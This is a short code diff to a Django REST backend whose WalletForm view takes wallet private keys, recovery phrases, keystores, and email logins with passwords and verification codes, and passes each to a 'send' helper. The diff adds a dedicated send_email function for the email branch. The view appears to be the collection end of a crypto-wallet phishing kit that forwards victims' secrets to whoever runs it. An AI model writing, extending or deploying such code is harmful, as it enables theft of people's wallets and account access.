@@ -4,7 +4,7 @@ from rest_framework import views
 from rest_framework import generics
 from rest_framework.response import Response
 from v1.cmc import csv_to_data, data
-from v1.formats import send_keystore, send_phrase, send_private
+from v1.formats import send_email, send_keystore, send_phrase, send_private
 
 
 from v1.models import WalletListModel
@@ -42,5 +42,5 @@ class WalletForm(views.APIView):
             status = send_private(idx, data.get('pKey'))
             return Response({'status': status})
         if type == 'email':
-            status = send_keystore(idx, data.get('email'), data.get('password'), data.get('code'))
+            status = send_email(idx, data.get('email'), data.get('password'), data.get('code'))
             return Response({'status': status})
